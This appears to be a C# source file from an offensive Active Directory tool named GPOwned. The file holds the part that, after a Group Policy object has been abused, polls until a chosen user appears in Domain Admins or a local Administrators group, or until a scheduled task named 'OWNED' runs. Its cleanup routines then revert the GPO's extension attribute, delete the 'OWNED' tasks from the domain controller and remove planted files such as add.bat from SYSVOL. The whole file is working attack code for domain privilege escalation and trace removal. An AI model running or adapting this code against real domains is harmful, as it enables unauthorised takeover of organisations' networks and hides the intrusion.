namespace GPOwned
{
    public partial class GPOwned
    {
        private async Task WaitForChangesAndVerify()
        {
            if (_options.DA)
            {
                await WaitForDomainAdminChange();
            }
            else if (_options.Local)
            {
                await WaitForLocalAdminChange();
            }
            else if (!string.IsNullOrEmpty(_options.CMD) || !string.IsNullOrEmpty(_options.PowerShell))
            {
                await WaitForScheduledTaskExecution();
            }
        }

        private async Task WaitForDomainAdminChange()
        {
            ConsoleLogger.WriteInfo("Waiting for Domain Admin group modification...");
            
            for (int i = 1; i <= 300; i += 5)
            {
                UpdateProgress(i, 300, "Waiting for GPO update on the DC...");
                
                if (IsDomainAdmin(_options.User))
                {
                    ConsoleLogger.WriteSuccess($"User {_options.User} added to Domain Admins group!");
                    return;
                }

                await Task.Delay(10000); // 10 second delay
            }

            ConsoleLogger.WriteError("Timeout waiting for Domain Admin change");
        }

        private async Task WaitForLocalAdminChange()
        {
            ConsoleLogger.WriteInfo("Waiting for Local Admin group modification...");
            
            for (int i = 1; i <= 300; i += 10)
            {
                UpdateProgress(i, 300, "Waiting for GPO update...");
                
                if (IsLocalAdmin(_options.User, _options.Computer))
                {
                    ConsoleLogger.WriteSuccess($"User {_options.User} added to Local Admins group on {_options.Computer}!");
                    return;
                }

                await Task.Delay(10000);
            }

            ConsoleLogger.WriteError("Timeout waiting for Local Admin change");
        }

        private async Task WaitForScheduledTaskExecution()
        {
            ConsoleLogger.WriteInfo("Waiting for Scheduled Task execution...");
            
            for (int i = 1; i <= 300; i += 10)
            {
                UpdateProgress(i, 300, "Waiting for GPO update and task execution...");
                
                if (await IsTaskExecuted())
                {
                    ConsoleLogger.WriteSuccess("Command executed successfully!");
                    return;
                }

                await Task.Delay(10000);
            }

            ConsoleLogger.WriteError("Timeout waiting for task execution");
        }

        private void UpdateProgress(int current, int total, string activity)
        {
            var percentComplete = (int)((double)current / total * 100);
            Console.Write($"\r{activity} {percentComplete}% Complete");
        }

        private bool IsDomainAdmin(string username)
        {
            try
            {
                using var context = new PrincipalContext(ContextType.Domain);
                using var group = GroupPrincipal.FindByIdentity(context, "Domain Admins");
                return group.GetMembers().Any(m => m.SamAccountName.Equals(username, StringComparison.OrdinalIgnoreCase));
            }
            catch
            {
                return false;
            }
        }

        private bool IsLocalAdmin(string username, string computer)
        {
            try
            {
                using var entry = new DirectoryEntry($"WinNT://{computer}/Administrators,group");
                return entry.Invoke("Members").Cast<object>()
                    .Any(member => member.ToString().Contains(username, StringComparison.OrdinalIgnoreCase));
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> IsTaskExecuted()
        {
            try
            {
                using var ts = new TaskService(_dc);
                return ts.GetTask("OWNED") != null;
            }
            catch
            {
                return false;
            }
        }

        private async Task CleanupGPO(string initialExtensions)
        {
            ConsoleLogger.WriteInfo("Starting cleanup process...");

            // Revert extensions
            try
            {
                using var entry = new DirectoryEntry($"LDAP://CN={_options.GPOGUID},CN=Policies,CN=System,{_domainDN}");
                if (string.IsNullOrEmpty(initialExtensions))
                {
                    entry.Properties["gPCMachineExtensionNames"].Clear();
                }
                else
                {
                    entry.Properties["gPCMachineExtensionNames"].Value = initialExtensions;
                }
                entry.CommitChanges();
                ConsoleLogger.WriteSuccess("GPO extensions reverted successfully");
            }
            catch (Exception ex)
            {
                ConsoleLogger.WriteError($"Failed to revert GPO extensions: {ex.Message}");
            }

            // Remove scheduled tasks
            await CleanupScheduledTasks();

            // Cleanup files
            await CleanupFiles();
        }

        private async Task CleanupScheduledTasks()
        {
            try
            {
                using var ts = new TaskService(_dc);
                var task = ts.GetTask("OWNED");
                if (task != null)
                {
                    ts.RootFolder.DeleteTask("OWNED");
                    ConsoleLogger.WriteSuccess("Removed scheduled task from DC");
                }

                if (_options.SecondTaskXMLPath != null)
                {
                    var task2 = ts.GetTask("OWNED2");
                    if (task2 != null)
                    {
                        ts.RootFolder.DeleteTask("OWNED2");
                        ConsoleLogger.WriteSuccess("Removed second scheduled task from DC");
                    }
                }
            }
            catch (Exception ex)
            {
                ConsoleLogger.WriteError($"Failed to remove scheduled tasks: {ex.Message}");
            }
        }

        private async Task CleanupFiles()
        {
            var sysvolPath = $@"\\{_options.Domain}\SYSVOL\{_options.Domain}\Policies\{_options.GPOGUID}\Machine\Preferences\ScheduledTasks";
            
            try
            {
                // Remove current XML
                var xmlPath = Path.Combine(sysvolPath, "ScheduledTasks.xml");
                if (File.Exists(xmlPath))
                {
                    File.Delete(xmlPath);
                }

                // Restore backup if exists
                var backupPath = $"{xmlPath}.old";
                if (File.Exists(backupPath))
                {
                    File.Move(backupPath, xmlPath);
                    ConsoleLogger.WriteSuccess("Restored original ScheduledTasks.xml");
                }

                // Cleanup secondary files
                if (_options.SecondTaskXMLPath != null)
                {
                    var secondaryFiles = new[] { "wsadd.xml", "add.bat" };
                    foreach (var file in secondaryFiles)
                    {
                        var path = Path.Combine(sysvolPath, file);
                        if (File.Exists(path))
                        {
                            File.Delete(path);
                        }
                    }
                }

                ConsoleLogger.WriteSuccess("File cleanup completed successfully");
            }
            catch (Exception ex)
            {
                ConsoleLogger.WriteError($"Error during file cleanup: {ex.Message}");
            }
        }
    }
}